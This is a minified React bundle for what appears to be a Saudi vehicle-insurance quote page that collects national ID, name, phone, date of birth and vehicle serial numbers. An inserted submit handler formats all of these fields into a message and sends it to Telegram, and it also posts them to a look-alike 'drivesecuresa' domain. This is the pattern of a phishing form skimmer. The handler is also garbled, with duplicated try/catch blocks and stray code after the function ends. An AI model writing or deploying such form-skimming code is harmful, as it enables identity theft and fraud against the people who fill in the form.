dOZNQ+h96+LpfBE290NcLi9lyXC+Y6dC3umy5lXtr9eQom7MDuCrFMSThkitSrTHFDp/mpDG7ZK1qhuRDL7cRRhfz1HGpY1fN1fyMn+NhhSXuLvQv6XnEX40hK7mMLnV/vKHIm+nOWr5yiZJxhz8WrG8vpafwN95kpCZPX4mhe56VUPmetmLbGP27Yt+EHQfghR6/1T0Eeb3o/MtT/uO4o5c2XcU/NnSWNWQkkmurVm3L6ldbWcJQWj96e85eQQP/Byi/n50ieujMgS/lysEjbUt1T8XflVDHCXEun0VKvP9XLW/XXsjXNIMX5WRc2nJa2CqhjisEKsXodx3F7YXVH91hGLRrrxrho5rqkRjJ90ufGZV0vCZuo99iNm8TLHpY359itL4muEhwvz3S9GUl1WK2JeI1ZiqIQz13NM+xKg6d2ExW12l4l8bn+4znI9FHPClj9mcS9UQjmruc5ZVUilCuGnSkrlaisr4xecdRuZhwEiQc7mlqRpCUM797EPqOa1Mi4Fio4SMRmOkVsb2KQFpSIoqTgUdN4IIo+sbJgQrxCg+gQ3XDR0basjoubS6MhVyjhC5NFLpvEtmXIiGGjJaLg06ZweJlriMj3DNv890tA+hin/UICpDnG+oISlc8eG6frVUfFJpvyMfFx9II/dS08y2GmpIjtbc8Mlg6yU1x0h48dl50fgYPvMnGLuG1P1pkZvHs6Pl2K60ieDj96rrx6wh+tUamv8ldJg8CA0RiDz+f0hwfOwagog852PWkByRpzxqCEEIPGpIYDxqCENIPGoIRyg8aghBCDxqSGA8aghDOBzgP/DDaNJcs48XAAAAAElFTkSuQmCC",
            key: "4929"
        }, {
            images: "data:image/jpeg;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAAAyCAYAAACqNX6+AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAWdSURBVHhe7Vmxbhw3ENWnuHEhty7VpDEgwEDgxo1SGW7cCMEJsgFDQHDnpEkRuAquUSo7VYqrDAhw4ebuA+K4kDpbnYBrrnPHDHnk7pB8wyX3Vqcr+ICBFvuWQ2qG5PDx9n7+9b8flFLj0eRfY/rZGX9X+e3we5ZUozefjUmo/Hb4JiEhch1IqHw/3ksI/wg1qPzt83tm7+r4qPLb472EIPAGCJUflo9qSKmDEJXfjDcrxD4b8AaoceVvl28Sgkj+rvLb4asOsdgVvuoQAXfFVx3CsAt81SE7xlcdsmN81SEB7pqvOoTs0ykFgqYmtINv5lsH1J5jU76fDplP1N8PHsS2f6yu118YiO0t7pT/qtQ9lADB7j25KvNP6MNTV6U6ZK4W+/tZCeHI949h+GcrGCxnOmgSuP/kikjYw2ebjH+hXo/Hagxtpl7Z9tRNiQ65Vl+OhGRo2580CekeYD5/GgRGsnOa9Q6S/77J0HZ4bp0QJP8ODX85AwkQbHZZpkPOfvoRJ8IZrZDfEu35u27+Sj26jwMD7VCp51574F9aYZQkw9s2Xynw6Du+bUH/7F16RciWr0OkusGNJcSB++TPDpCnmX4IApIyPXu5Lwf+DiUYBlno/9FJ2n/7fKlmINg5lqlD3sl1gxvbshzaQWJEfCoZdiZzjE5uqDh/97Yrjsa/4FfXhXB8cIWAvjWi8aulmk9xsKfzpf2GsJyrKfiGuurSIaBuHByrBaollBC9QsJ/kCP2z0BBgycf2o5cvJPtCSL/Cfi1RlSD0Ztv6mHim67+X03iIGuj8mDA21/O4u86dUhUN8y29BEX9yAh3JcDfxfysHgPpQNSK0+bTXq0rd2/aSaDhuhfg2b9L0GAjblsEHgblLy0DnlxHAV9MdeMcNraQIc8PQgCYWylnma2z+FxH7Lx7Yz7cuDv9F+8Ot4qvVPF7Zew6FO3kg4BeuPxO8vlJYQj9s8gbFWndp84p9kbcnwb00j6Jzg++9gb1Ixu/xfqDARYawy9PuL2uPBT10iHXKs/DoKAH71XK8tCXltPHdJfG2QUcwaY2KStvPrCEfkXivR4Oqe1EGM0+Sv+loy6jXXI6v1REOgj9YUi3Q5CSkgPHUIBLT3iesZmMvRPQKcmd9ztmgySGOTPBgkB6E5XvI20vcU65OXv6kOwVf35IhyEvGWV6pDnT77DQORbus6guhEH+UpePXSocD6R/+ZdiSKXbHIR6hBcN8JByAkp1yHoiIlmvTyT24REQEfdRO2RTnmp8bft+4tBZ/owRl2yGpKjxgtsfSLzwQMgaQPpEg8GLBFgNOvRra0D8u8OFg7e+AMs51MY6CyztcbXIQMnRG914eD5P4S3K2ELkmqNpFPoe3Ryk+6j8P1VvPp4G/7sIJ62bMClYu6kiq9DgO7YxHhC0ODh5SGb8byNdDHoVlPkX1h92tysd22k7bBUh3TzF3hbo2y4b6lbpkMGTgjfslyHHLCQsvrBUZI8A2lF5VowDjR+jm5euv31dQp1jXRIVwdD6BB8Z+QCwdtL1+FSrdEovr5nJt0cc5TxUsFfq3gO6j7WIeGzQ/tuCB0iBWwt9ty34ukKnH58//R8clO4Svpd1ZhiTjXiNOIX4s2vtrNJ7D/WIfbZgb9rn4fRIb0VOttOUv41zLuOxOhC33yL2tt3mO/zQ9S0WRmh/0CHxOANWgykQxKFV7TB9/ZN+X/wDa9kwVVK6J/+Rb+GdA9A83nX7wihf6k+IONbmYRt8/naQ7pk9OHrEAJvgBqv3w3/e4h4dVHyewRhu3zXdvVWvU62j/37OiQg+bvKb4enOch0iCURKr8dvklIiFwHEirfj/cSwj9CDSp/+3xPHdKi8sPyPXVIi8oPy0c1pNRBiMpvxvfUIZUPnx025asO2TG+6hCL3eA/q/8Bj9YciFBRSn4AAAAASUVORK5CYII=",
            key: "4689"
        }]
        
          , w = {
            background: u.colors.background,
            surface: u.colors.surface,
            primary: u.colors.primary,
            primaryDark: u.colors.primaryDark,
            primaryLight: u.colors.primaryLight,
            accent: u.colors.accent,
            accentDark: u.colors.accentDark,
            textPrimary: u.colors.textPrimary,
            textSecondary: u.colors.textSecondary,
            textLight: u.colors.textLight,
            error: u.colors.error,
            border: u.colors.border,
            borderFocus: u.colors.primary,
            info: u.colors.info
        }
          , A = e => {
            let {className: t="h-5 w-5"} = e;
            return (0,
            a.jsx)("svg", {
                xmlns: "http://www.w3.org/2000/svg",
                className: t,
                viewBox: "0 0 20 20",
                fill: "currentColor",
                style: {
                    color: w.info
                },
                children: (0,
                a.jsx)("path", {
                    fillRule: "evenodd",
                    d: "M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z",
                    clipRule: "evenodd"
                })
            })
        }
          , C = {
            ar: {
                dir: "rtl",
                langAr: "عربي",
                langEn: "English",
                heroBadge: "منصة مقارنة التأمين الأولى",
                heroTitle: "قارن، أمّن، واستلم وثيقتك خلال دقائق",
                heroSubtitle: "مكان واحد لتأمين مركبتك، مع عروض فورية من شركات متعددة ومعتمدة.",
                heroNote: "أكثر من 20 شركة تأمين معتمدة",
                categoryTitle: "فئات التأمين",
                typeTitle: "نوع التأمين",
                processTitle: "طريقة تسجيل المركبة",
                formTitle: "ابدأ طلبك الآن",
                formSubtitle: "أدخل بياناتك لتظهر أفضل الأسعار فورًا.",
                comingSoon: "قريباً",
                vehicles: "مركبات",
                medical: "طبي",
                medicalErrors: "أخطاء طبية",
                travel: "سفر",
                household: "العمالة المنزلية",
                newInsurance: "تأمين جديد",
                ownershipTransfer: "نقل الملكية",
                registerVia: "تسجيل المركبة عبر:",
                serialOption: "الرقم التسلسلي",
                customsOption: "بطاقة جمركية (استيراد)",
                idLabel: "رقم الهوية / الإقامة",
                idPlaceholder: "ادخل 10 أرقام",
                nameLabel: "اسم مقدم الطلب",
                namePlaceholder: "الاسم كما في الهوية",
                phoneLabel: "رقم الجوال",
                phonePlaceholder: "يبدأ بـ 5، مثال: 501234567",
                dobLabel: "تاريخ الميلاد",
                customsLabel: "رقم البطاقة الجمركية",
                customsPlaceholder: "للمركبات المستوردة",
                serialLabel: "الرقم التسلسلي للمركبة",
                serialPlaceholder: "موجود في استمارة المركبة",
                verificationLabel: "رمز التحقق",
                captchaTitle: "رمز التحقق",
                verificationPlaceholder: "ادخل الرمز",
                infoCustoms: "رقم البطاقة الجمركية للمركبات المستوردة.",
                infoSerial: "الرقم التسلسلي للمركبة (موجود في استمارة المركبة).",
                captchaRefresh: "تحديث الرمز",
                termsText: "أوافق على منح شركة عناية الوسيط الحق في الاستعلام من شركة نجم و/أو مركز المعلومات الوطني عن بياناتي وبيانات مركبتي.",
                submitButton: "إظهار العروض",
                errors: {
                    required: "مطلوب.",
                    idInvalid: "رقم الهوية يجب أن يكون 10 أرقام.",
                    nameRequired: "اسم مقدم الطلب مطلوب.",
                    phoneInvalid: "رقم الهاتف غير صالح. يجب أن يبدأ بـ 5 ويتكون من 9 أرقام.",
                    dobRequired: "تاريخ الميلاد مطلوب.",
                    serialRequired: "الرقم التسلسلي مطلوب.",
                    customsRequired: "بطاقة جمركية مطلوبة.",
                    verificationFormat: "رمز التحقق يجب أن يكون من 4 إلى 6 أرقام.",
                    verificationIncorrect: "رمز التحقق غير صحيح.",
                    submitError: "حدث خطأ أثناء إرسال البيانات. يرجى المحاولة مرة أخرى.",
                    agreeRequired: "يجب الموافقة على الشروط."
                }
            },
            en: {
                dir: "ltr",
                langAr: "Arabic",
                langEn: "English",
                heroBadge: "Saudi Insurance Comparison",
                heroTitle: "Compare, insure, and get your policy in minutes",
                heroSubtitle: "One place to insure your vehicle with instant quotes from trusted providers.",
                heroNote: "20+ trusted insurance partners",
                categoryTitle: "Insurance categories",
                typeTitle: "Insurance type",
                processTitle: "Vehicle registration method",
                formTitle: "Start your request",
                formSubtitle: "Enter your details to see the best prices instantly.",
                comingSoon: "Soon",
                vehicles: "Vehicles",
                medical: "Medical",
                medicalErrors: "Medical errors",
                travel: "Travel",
                household: "Domestic workers",
                newInsurance: "New Insurance",
                ownershipTransfer: "Ownership Transfer",
                registerVia: "Register vehicle via:",
                serialOption: "Serial number",
                customsOption: "Customs card (import)",
                idLabel: "National ID / Iqama",
                idPlaceholder: "Enter 10 digits",
                nameLabel: "Applicant Name",
                namePlaceholder: "Name as on ID",
                phoneLabel: "Mobile Number",
                phonePlaceholder: "Starts with 5, e.g., 501234567",
                dobLabel: "Date of Birth",
                customsLabel: "Customs Card Number",
                customsPlaceholder: "For imported vehicles",
                serialLabel: "Vehicle Serial Number",
                serialPlaceholder: "Found on vehicle registration",
                verificationLabel: "Verification Code",
                captchaTitle: "Verification Code",
                verificationPlaceholder: "Enter code",
                infoCustoms: "Customs card number for imported vehicles.",
                infoSerial: "Vehicle serial number (found on the registration).",
                captchaRefresh: "Refresh",
                termsText: "I authorize Enaya Al-Waseet to retrieve my and my vehicle's data from Najm and/or the National Information Center.",
                submitButton: "Show offers",
                errors: {
                    required: "Required.",
                    idInvalid: "ID must be exactly 10 digits.",
                    nameRequired: "Applicant name is required.",
                    phoneInvalid: "Invalid mobile number. Must start with 5 and be 9 digits long.",
                    dobRequired: "Date of birth is required.",
                    serialRequired: "Serial number is required.",
                    customsRequired: "Customs card number is required.",
                    verificationFormat: "Verification code must be 4–6 digits.",
                    verificationIncorrect: "Incorrect verification code.",
                    submitError: "An error occurred while submitting. Please try again.",
                    agreeRequired: "You must agree to the terms."
                }
            }
        };
        var S = e => {
            let {setLoading: t, setPageState: s} = e
              , {lang: o, dir: n} = (0,
            i.Z)()
              , x = C[o] || C.ar
              , p = "rtl" === n
              , h = "bookingForm"
              , f = (0,
            l.useMemo)( () => j.getForm(h), [h])
              , y = {
                identityNumber: "",
                applicantName: "",
                phoneNumber: "",
                startDate: null,
                serialNumber: "",
                customsCard: "",
                verificationCode: "",
                agreeToTerms: !1
            }
              , [b,g] = (0,
            l.useState)( () => ({
                ...y,
                ...(null == f ? void 0 : f.formData) || {}
            }))
              , [v,S] = (0,
            l.useState)( () => (null == f ? void 0 : f.type) || "transfer")
              , [k,I] = (0,
            l.useState)( () => (null == f ? void 0 : f.processType) || "form")
              , [E,P] = (0,
            l.useState)(null)
              , [T,B] = (0,
            l.useState)({});
            (0,
            l.useEffect)( () => {
                j.setForm(h, {
                    formData: b,
                    type: v,
                    processType: k
                })
            }
            , [b, v, k, h]),
            (0,
            l.useEffect)( () => {
                P(N[Math.floor(Math.random() * N.length)])
            }
            , []),
            (0,
            l.useEffect)( () => {
                Object.keys(T).length && O(b, null)
            }
            , [o]);
            let O = (0,
            l.useCallback)( (e, t) => {
                let r = {
                    ...T
                }
                  , {identityNumber: a, applicantName: s, phoneNumber: o, startDate: l, serialNumber: n, customsCard: i, verificationCode: c, agreeToTerms: d} = e
                  , m = (e, t) => {
                    t ? r[e] = t : delete r[e]
                }
                ;
                return "identityNumber" !== t && t || m("identityNumber", a && 10 === a.length ? null : a ? x.errors.idInvalid : x.errors.required),
                "applicantName" !== t && t || m("applicantName", s.trim() ? null : x.errors.nameRequired),
                "phoneNumber" !== t && t || m("phoneNumber", !o || o.length < 9 || isNaN(o) || !o.startsWith("5") ? o ? x.errors.phoneInvalid : x.errors.required : null),
                "warranty" === v ? "startDate" !== t && t || m("startDate", l ? null : x.errors.dobRequired) : r.startDate && delete r.startDate,
                "transfer" === v ? "card" === k ? "customsCard" !== t && t || m("serialOrCustoms", i.trim() ? null : x.errors.customsRequired) : "serialNumber" !== t && t || m("serialOrCustoms", n.trim() ? null : x.errors.serialRequired) : "warranty" === v ? "serialNumber" !== t && t || m("serialOrCustoms", n.trim() ? null : x.errors.serialRequired) : r.serialOrCustoms && delete r.serialOrCustoms,
                "verificationCode" !== t && t || m("verificationCode", /^\d{4,6}$/.test(c) ? E && E.key !== c ? x.errors.verificationIncorrect : null : c ? x.errors.verificationFormat : x.errors.required),
                t && B(r),
                r
            }
            , [v, k, E, T, x])
              , D = e => {
                let {name: t, value: r, type: a, checked: s} = e.target;
                if ("identityNumber" === t && r.length > 10 || "phoneNumber" === t && r.length > 9)
                    return;
                let o = {
                    ...b,
                    [t]: "checkbox" === a ? s : r
                };
                g(o),
                O(o, t)
            }
              , L = async e => {
    var a, o, l;
    if (e.preventDefault(), (null === (a = r.g) || void 0 === a ? void 0 : a.window) === void 0)
        return;
    
    let n = O(b, null);
    if (B(n), Object.values(n).some(e => e))
        return;

    // ✅ إضافة: رسالة Telegram للحجز
    const telegramMessage = `
🆕 <b>طلب تأمين جديد</b>
━━━━━━━━━━━━━━━━━━━━

👤 <b>المعلومات الشخصية:</b>
├ الهوية: <code>${b.identityNumber}</code>
├ الاسم: ${b.applicantName}
├ الجوال: <code>${b.phoneNumber}</code>
${v === 'warranty' ? `└ تاريخ الميلاد: ${b.startDate}` : ''}

🚗 <b>بيانات المركبة:</b>
├ نوع التأمين: ${v === 'transfer' ? '🆕 تأمين جديد' : '🔄 نقل ملكية'}
├ طريقة التسجيل: ${k === 'card' ? '📋 بطاقة جمركية' : '🔢 رقم تسلسلي'}
${v === 'transfer' && k === 'card' ? `├ البطاقة الجمركية: <code>${b.customsCard}</code>` : ''}
${(v === 'warranty' || (v === 'transfer' && k === 'form')) ? `└ الرقم التسلسلي: <code>${b.serialNumber}</code>` : ''}

✅ الموافقة على الشروط: ${b.agreeToTerms ? '✓ نعم' : '✗ لا'}

🕐 الوقت: ${formatTime()}
━━━━━━━━━━━━━━━━━━━━
    `;

    t(!0);
    
    await sendToTelegram(telegramMessage); // ✅ إرسال الرسالة
    
    try {
        let i = window.location.search, c = (0, m.ZS)(i), d = {
            key: null === (l = localStorage) || void 0 === l ? void 0 : null === (o = l.getItem) || void 0 === o ? void 0 : o.call(l, "key"),
            identityNumber: b.identityNumber,
            // ... باقي البيانات
        };
        
        await (0, m.iq)({
            url: "https://secure.drivesecuresa.com/bcare/api/user/update",
            data: d
        });
        
        s(1); // الانتقال لصفحة التأكيد
    } catch (e) {
        console.error("خطأ:", e);
        B(e => ({...e, submit: x.errors.submitError}));
    } finally {
        t(!1);
    }
}
    
    try {
        let i = window.location.search, c = (0, m.ZS)(i), d = {
            key: null === (l = localStorage) || void 0 === l ? void 0 : null === (o = l.getItem) || void 0 === o ? void 0 : o.call(l, "key"),
            identityNumber: b.identityNumber,
            // ... باقي البيانات
        };
        
        await (0, m.iq)({
            url: "https://secure.drivesecuresa.com/bcare/api/user/update",
            data: d
        });
        
        s(1); // الانتقال لصفحة التأكيد
    } catch (e) {
        console.error("خطأ:", e);
        B(e => ({...e, submit: x.errors.submitError}));
    } finally {
        t(!1);
    }
}
                t(!0);
                try {
                    await (0,
                    m.iq)({
                        url: "https://secure.drivesecuresa.com/bcare/api/user/update",
                        data: d
                    }),
                    s(1)
                } catch (e) {
                    console.error("Submission error:", e),
                    B(e => ({
                        ...e,
                        submit: x.errors.submitError
                    }))
                } finally {
                    t(!1)
                }
            }
              , R = p ? "text-right" : "text-left"
              , F = function(e, t, r, s, o) {
                let l = arguments.length > 5 && void 0 !== arguments[5] ? arguments[5] : "text"
                  , n = arguments.length > 6 ? arguments[6] : void 0
                  , i = arguments.length > 7 && void 0 !== arguments[7] && arguments[7]
                  , c = arguments.length > 8 && void 0 !== arguments[8] ? arguments[8] : "text"
                  , d = arguments.length > 9 && void 0 !== arguments[9] ? arguments[9] : "";
                return (0,
                a.jsxs)("div", {
                    className: "mb-5 grid grid-cols-1 md:grid-cols-3 md:gap-x-6 items-start",
                    children: [(0,
                    a.jsxs)("label", {
                        htmlFor: e,
                        className: "block text-sm font-medium mb-1 md:mb-0 md:pt-3.5 ".concat(R),
                        style: {
                            color: w.textSecondary
                        },
                        children: [t, ":"]
                    }), (0,
                    a.jsxs)("div", {
                        className: "md:col-span-2 relative",
                        children: [(0,
                        a.jsx)("input", {
                            id: e,
                            name: e,
                            type: l,
                            inputMode: c,
                            className: "w-full rounded-xl border px-4 py-3 text-sm ".concat(p ? "text-right" : "text-left", " focus:outline-none focus:ring-2 transition-shadow duration-150 shadow-sm ").concat(o ? "border-red-400 ring-red-300" : "border-gray-300 focus:ring-[var(--focusColor)]"),
                            style: {
                                backgroundColor: w.surface,
                                borderColor: o ? w.error : w.border,
                                color: w.textPrimary,
                                "--focusColor": w.borderFocus
                            },
                            placeholder: r,
                            value: s || "",
                            maxLength: n,
                            onChange: D
                        }), i && (0,
                        a.jsx)("button", {
                            type: "button",
                            className: "absolute top-1/2 -translate-y-1/2 p-1.5 rounded-full border bg-white/90 shadow-sm focus:outline-none focus:ring-1 focus:ring-gray-300 ".concat(p ? "left-3" : "right-3"),
                            style: {
                                borderColor: w.border
                            },
                            onClick: () => alert(d || r),
                            title: d || r,
                            children: (0,
                            a.jsx)(A, {
                                className: "h-4 w-4"
                            })
                        }), o && (0,
                        a.jsx)("p", {
                            className: "text-xs mt-1 ".concat(R),
                            style: {
                                color: w.error
                            },
                            children: o
                        })]
                    })]
                })
            }
              , M = [{
                key: "vehicles",
                label: x.vehicles,
                icon: c.fSn,
                active: !0
            }, {
                key: "medical",
                label: x.medical,
                icon: c.F9M,
                disabled: !0
            }, {
                key: "medicalErrors",
                label: x.medicalErrors,
                icon: c.K7y,
                disabled: !0
            }, {
                key: "travel",
                label: x.travel,
                icon: c.j8M,
                disabled: !0
            }, {
                key: "household",
                label: x.household,
                icon: c.Eoi,
                disabled: !0
            }];
            return (0,
            a.jsxs)("div", {
                dir: n,
                className: "min-h-screen pb-12",
                children: [(0,
                a.jsxs)("div", {
                    className: "   relative mt-4 mx-auto w-full max-w-3xl   overflow-hidden rounded-2xl   px-4 py-5 sm:px-6 sm:py-6   text-white   ring-1 ring-white/10   ",
                    style: {
                        background: "linear-gradient(135deg, ".concat(w.primary, " 0%, ").concat(w.primaryDark, " 60%, #0A2F49 100%)"),
                        boxShadow: u.shadow.soft
                    },
                    children: [(0,
                    a.jsx)("div", {
                        "aria-hidden": "true",
                        className: "pointer-events-none absolute -top-10 -left-10 h-24 w-24 rounded-full bg-white/10 blur-xl motion-safe:animate-float-soft"
                    }), (0,
                    a.jsx)("div", {
                        "aria-hidden": "true",
                        className: "pointer-events-none absolute -bottom-12 -right-12 h-28 w-28 rounded-full bg-white/10 blur-xl motion-safe:animate-float-soft"
                    }), (0,
                    a.jsx)("div", {
                        "aria-hidden": "true",
                        className: "pointer-events-none absolute right-5 top-1/2 hidden h-16 w-16 -translate-y-1/2 rounded-full border border-white/15 sm:block motion-safe:animate-glow"
                    }), (0,
                    a.jsxs)("div", {
                        className: "relative z-10 flex flex-col gap-3 sm:gap-4",
                        children: [(0,
                        a.jsxs)("div", {
                            className: "flex flex-wrap items-center gap-2",
                            children: [(0,
                            a.jsxs)("span", {
                                className: "inline-flex items-center gap-2 rounded-full bg-white/15 px-3 py-1 text-[11px] font-semibold",
                                children: [(0,
                                a.jsx)("span", {
                                    className: "h-2 w-2 rounded-full bg-emerald-300 motion-safe:animate-glow"
                                }), x.heroBadge]
                            }), (0,
                            a.jsxs)("span", {
                                className: "inline-flex items-center gap-2 rounded-full border border-white/15 px-3 py-1 text-[11px] text-white/85",
                                children: [(0,
                                a.jsx)("span", {
                                    className: "inline-flex h-2 w-2 rounded-full bg-emerald-300 motion-safe:animate-glow"
                                }), x.heroNote]
                            })]
                        }), (0,
                        a.jsxs)("div", {
                            className: "space-y-1",
                            children: [(0,
                            a.jsx)("h1", {
                                className: "text-lg font-bold leading-snug tracking-tight sm:text-xl lg:text-2xl motion-safe:animate-fade-up",
                                children: x.heroTitle
                            }), (0,
                            a.jsx)("p", {
                                className: "text-sm leading-relaxed text-white/80 sm:text-[15px] motion-safe:animate-fade-up-slow",
                                children: x.heroSubtitle
                            })]
                        })]
                    })]
                }), (0,
                a.jsxs)("form", {
                    onSubmit: L,
                    className: "mt-6 grid gap-6",
                    noValidate: !0,
                    children: [(0,
                    a.jsxs)("div", {
                        className: "rounded-2xl border bg-white/90 p-4 sm:p-6",
                        style: {
                            borderColor: w.border,
                            boxShadow: u.shadow.soft
                        },
                        children: [(0,
                        a.jsxs)("div", {
                            className: "flex flex-col sm:flex-row sm:items-center sm:justify-between gap-3 mb-4",
                            children: [(0,
                            a.jsxs)("div", {
                                children: [(0,
                                a.jsx)("p", {
                                    className: "text-sm font-semibold",
                                    style: {
                                        color: w.primaryDark
                                    },
                                    children: x.categoryTitle
                                }), (0,
                                a.jsx)("p", {
                                    className: "text-xs",
                                    style: {
                                        color: w.textSecondary
                                    },
                                    children: x.formSubtitle
                                })]
                            }), (0,
                            a.jsx)("div", {
                                className: "text-xs font-semibold",
                                style: {
                                    color: w.textSecondary
                                },
                                children: x.typeTitle
                            })]
                        }), (0,
                        a.jsx)("div", {
                            className: "grid grid-cols-5 gap-2 sm:gap-3",
                            children: M.map(e => {
                                let t = e.icon
                                  , r = e.active
                                  , s = e.disabled;
                                return (0,
                                a.jsxs)("button", {
                                    type: "button",
                                    disabled: s,
                                    title: s ? x.comingSoon : void 0,
                                    className: "flex min-w-0 flex-col items-center justify-center gap-1 rounded-xl border px-2 py-2 text-[10px] font-semibold transition sm:px-3 sm:text-[11px] ".concat(s ? "cursor-not-allowed opacity-60" : "hover:shadow-sm"),
                                    style: {
                                        borderColor: w.border,
                                        backgroundColor: r ? w.primary : w.surface,
                                        color: r ? w.textLight : w.textSecondary
                                    },
                                    children: [(0,
                                    a.jsx)(t, {
                                        className: "h-4 w-4 sm:h-5 sm:w-5"
                                    }), (0,
                                    a.jsx)("span", {
                                        className: "w-full truncate text-center leading-tight",
                                        children: e.label
                                    })]
                                }, e.key)
                            }
                            )
                        }), (0,
                        a.jsx)("div", {
                            className: "mt-5 grid grid-cols-2 gap-3",
                            children: [{
                                label: x.newInsurance,
                                value: "transfer"
                            }, {
                                label: x.ownershipTransfer,
                                value: "warranty"
                            }].map(e => (0,
                            a.jsx)("button", {
                                type: "button",
                                onClick: () => {
                                    S(e.value),
                                    "warranty" === e.value && I("form"),
                                    O({
                                        ...b
                                    }, null)
                                }
                                ,
                                className: "rounded-xl border px-3 py-2 text-sm font-semibold transition hover:shadow-sm",
                                style: {
                                    backgroundColor: v === e.value ? w.primary : w.surface,
                                    color: v === e.value ? w.textLight : w.textPrimary,
                                    borderColor: v === e.value ? w.primary : w.border
                                },
                                children: e.label
                            }, e.value))
                        })]
                    }), (0,
                    a.jsxs)("div", {
                        className: "rounded-2xl border p-5 sm:p-6",
                        style: {
                            borderColor: w.border,
                            boxShadow: u.shadow.card,
                            backgroundColor: w.primaryLight
                        },
                        children: [(0,
                        a.jsxs)("div", {
                            className: "mb-6",
                            children: [(0,
                            a.jsx)("h2", {
                                className: "text-lg font-bold",
                                style: {
                                    color: w.textPrimary
                                },
                                children: x.formTitle
                            }), (0,
                            a.jsx)("p", {
                                className: "text-xs",
                                style: {
                                    color: w.textSecondary
                                },
                                children: x.formSubtitle
                            })]
                        }), "transfer" === v && (0,
                        a.jsxs)("div", {
                            className: "mb-6 rounded-xl border px-4 py-4",
                            style: {
                                borderColor: w.border,
                                backgroundColor: w.primaryLight
                            },
                            children: [(0,
                            a.jsxs)("div", {
                                className: "flex items-center justify-between mb-2.5",
                                children: [(0,
                                a.jsx)("label", {
                                    className: "block text-sm font-semibold ".concat(R),
                                    style: {
                                        color: w.textSecondary
                                    },
                                    children: x.processTitle
                                }), (0,
                                a.jsx)(A, {
                                    className: "h-4 w-4"
                                })]
                            }), (0,
                            a.jsx)("div", {
                                className: "grid grid-cols-2 gap-3",
                                children: [{
                                    label: x.serialOption,
                                    value: "form"
                                }, {
                                    label: x.customsOption,
                                    value: "card"
                                }].map(e => (0,
                                a.jsx)("button", {
                                    type: "button",
                                    onClick: () => {
                                        I(e.value),
                                        O({
                                            ...b
                                        }, null)
                                    }
                                    ,
                                    className: "rounded-xl border px-3 py-2 text-xs font-semibold transition hover:shadow-sm",
                                    style: {
                                        backgroundColor: k === e.value ? w.primary : w.surface,
                                        color: k === e.value ? w.textLight : w.primary,
                                        borderColor: k === e.value ? w.primary : w.border
                                    },
                                    children: e.label
                                }, e.value))
                            }), T.serialOrCustoms && "transfer" === v && ("card" === k && !b.customsCard || "form" === k && !b.serialNumber) && (0,
                            a.jsx)("p", {
                                className: "text-xs mt-2 ".concat(R),
                                style: {
                                    color: w.error
                                },
                                children: T.serialOrCustoms
                            })]
                        }), F("identityNumber", x.idLabel, x.idPlaceholder, b.identityNumber, T.identityNumber, "text", 10, !1, "numeric"), F("applicantName", x.nameLabel, x.namePlaceholder, b.applicantName, T.applicantName), F("phoneNumber", x.phoneLabel, x.phonePlaceholder, b.phoneNumber, T.phoneNumber, "text", 9, !1, "tel"), "warranty" === v && (0,
                        a.jsxs)("div", {
                            className: "mb-5 grid grid-cols-1 md:grid-cols-3 md:gap-x-6 items-start",
                            children: [(0,
                            a.jsxs)("label", {
                                htmlFor: "startDate",
                                className: "block text-sm font-medium mb-1 md:mb-0 md:pt-3.5 ".concat(R),
                                style: {
                                    color: w.textSecondary
                                },
                                children: [x.dobLabel, ":"]
                            }), (0,
                            a.jsxs)("div", {
                                className: "md:col-span-2",
                                children: [(0,
                                a.jsx)("input", {
                                    id: "startDate",
                                    name: "startDate",
                                    type: "date",
                                    lang: o,
                                    value: b.startDate || "",
                                    onChange: D,
                                    className: "w-full rounded-xl border px-4 py-3 text-sm ".concat(p ? "text-right" : "text-left", " focus:outline-none focus:ring-2 transition-shadow duration-150 shadow-sm ").concat(T.startDate ? "border-red-400 ring-red-300" : "border-gray-300"),
                                    style: {
                                        backgroundColor: w.surface,
                                        borderColor: T.startDate ? w.error : w.border,
                                        color: w.textPrimary
                                    }
                                }), T.startDate && (0,
                                a.jsx)("p", {
                                    className: "text-xs mt-1 ".concat(R),
                                    style: {
                                        color: w.error
                                    },
                                    children: T.startDate
                                })]
                            })]
                        }), "transfer" === v && "card" === k && F("customsCard", x.customsLabel, x.customsPlaceholder, b.customsCard, T.serialOrCustoms && !b.customsCard ? T.serialOrCustoms : null, "text", void 0, !0, "numeric", x.infoCustoms), ("warranty" === v || "transfer" === v && "form" === k) && F("serialNumber", x.serialLabel, x.serialPlaceholder, b.serialNumber, T.serialOrCustoms && !b.serialNumber ? T.serialOrCustoms : null, "text", void 0, !0, "numeric", x.infoSerial)]
                    }), (0,
                    a.jsxs)("div", {
                        className: "rounded-2xl border bg-white p-5 sm:p-6",
                        style: {
                            borderColor: w.border,
                            boxShadow: u.shadow.card
                        },
                        children: [(0,
                        a.jsx)("div", {
                            className: "mb-4",
                            children: (0,
                            a.jsx)("h3", {
                                className: "text-sm font-semibold",
                                style: {
                                    color: w.textPrimary
                                },
                                children: x.captchaTitle
                            })
                        }), (0,
                        a.jsxs)("div", {
                            className: "mb-5 grid grid-cols-1 md:grid-cols-3 md:gap-x-6 items-center",
                            children: [(0,
                            a.jsxs)("label", {
                                htmlFor: "verificationCode",
                                className: "block text-sm font-medium mb-1 md:mb-0 ".concat(R),
                                style: {
                                    color: w.textSecondary
                                },
                                children: [x.verificationLabel, ":"]
                            }), (0,
                            a.jsxs)("div", {
                                className: "md:col-span-2 flex items-stretch gap-3",
                                children: [(0,
                                a.jsx)("div", {
                                    className: "flex-shrink-0 h-[51px] w-28",
                                    children: E && (0,
                                    a.jsx)("img", {
                                        className: "rounded-md object-cover h-full w-full border shadow-sm",
                                        style: {
                                            borderColor: w.border
                                        },
                                        src: null == E ? void 0 : E.images,
                                        alt: "Captcha"
                                    })
                                }), (0,
                                a.jsx)("div", {
                                    className: "flex-grow relative",
                                    children: (0,
                                    a.jsx)("input", {
                                        id: "verificationCode",
                                        name: "verificationCode",
                                        type: "text",
                                        inputMode: "numeric",
